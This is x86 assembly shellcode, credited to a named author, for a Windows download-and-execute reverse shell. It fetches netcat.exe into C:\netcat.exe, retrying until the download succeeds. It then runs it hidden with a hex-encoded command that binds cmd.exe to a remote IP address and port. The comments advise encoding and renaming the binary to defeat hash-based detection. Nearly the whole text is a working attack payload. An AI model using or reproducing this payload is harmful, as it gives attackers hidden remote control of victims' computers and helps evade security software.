; Author: John Stigerwalt
; Reverse Shell - Download-Execute Netcat
;
; Netcat PEB executable should be encoded/modified to defeat file hash matching. 
; This is just a sample, do not use netcat.exe as your filename. 
;
; Hard Coded Addresses are used in this shellcode
; Use Arwin for DLL API Functions or add PEB search for api function addresses.
;
; Shellcode uses http://localhost/netcat.exe and C:\netcat.exe for URLDownloadToFileA function API call. Will need to change.
;
;
;
;			Kernel32.dll
; LoadLibaryA 		0x76d18940
; GetProcAddress 	0x76d14450
; CreateProccessA	
; ExitProcess		0x76d20790
; WinExec			0x76d566d0
;
;			Urlmon.dll
; URLDownloadToFileA	 0x6d6d3730
;
;
;
;
; UINT WinExec(
; 		LPCSTR lpCmdLine, - Send our command as first param
; 		UINT   uCmdShow   - Ties to the ShowWindow Function, will use SW_HIDE (Hides Window From poping up) which equals 0
;		);
;

;URLDownloadToFile
;pcaller
;szURL
;szFileName
;dwReserved
;lpfnCB


; Order of Shellcode Functions
; LoadLibaryA
; GetProcAddress
; URLDownloadToFileA (Loop until sucess)
; Winexec (Need to test alternative API Function Call)
; ExitProcess



bits 32
start:

; Get urlmon.dll
xor eax, eax
mov ax, 0x6e6f
push eax
push 0x6d6c7275
push esp

; LoadLibrary
mov ebx, 0x76d18940
call ebx
mov ebp, eax

; Get Function Name URLDownLoadA
xor eax, eax
mov ax, 0x4165
push eax
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255
push esp

push ebp

mov ebx, 0x76d14450 ; GetProcAddress
call ebx

; Call URLDownloadToFileA (NULL,url,save as,0,NULL)

push eax

download:
	
pop eax	
xor edx, edx			; Zero out EAX
xor ebx, ebx

push eax
pop esi				; save urlmon URLDownloadToFileA to esi for JNZ loop retry download

push ebx

push 0x20657865
push 0x2e746163
push 0x74656e2f
push 0x74736f68
push 0x6c61636f
push 0x6c2f2f3a
push 0x70747468
mov edx, esp			; URL (http://localhost/netcat.exe)

; netcat.exe (Save Default)
;mov bx, 0x6578
;push ebx
;PUSH 0x652e7461
;PUSH 0x6374656e			
;mov ebx, esp
;push ebx

; C:\netcat.exe
mov bl, 0x65
push ebx
push 0x78652e74
push 0x61637465
push 0x6e5c3a43
push esp				; szFileName (C:\netcat.exe)
pop ebx

;    (NULL,url,save as,0,NULL)

xor ecx, ecx			; Zero out ecx

push ecx				; push 0 to stack - lpfnCB
push ecx				; push 0 to stack - dwReserved
push ebx				; push pointer to szFileName
push edx				; push pointer to szURL
push ecx				; push 0 - pCaller

call eax				; call URLDownloadToFileA

xor edx, edx			; Set EDX to 0 to compare with EAX URLDownloadToFileA return
cmp eax, edx			; Compare if EAX is 0 or not, URLDownloadToFileA will return EAX to 0 on sucess.
push esi				; push urlmon URLDownloadToFileA back to stack, POP EAX will pick this back up to re-run through loop
jnz download			; Loop back to download:, try again until file is downloaded.

; Winexec

xor eax, eax
xor ebx, ebx
mov bx, 0x3535
push ebx
PUSH 0x35352038
PUSH 0x342e312e
PUSH 0x3836312e
PUSH 0x32393120
PUSH 0x6578652e
PUSH 0x646d6320
PUSH 0x652d2065
PUSH 0x78652e74
PUSH 0x61637465
PUSH 0x6e5c3a43
push esp
pop eax
push 10
push eax
mov ebx, 0x76d566d0
call ebx

; Exitprocess
xor edx, edx
inc edx
mov eax, 0x76d20790		; ExitProcess
call eax	
	
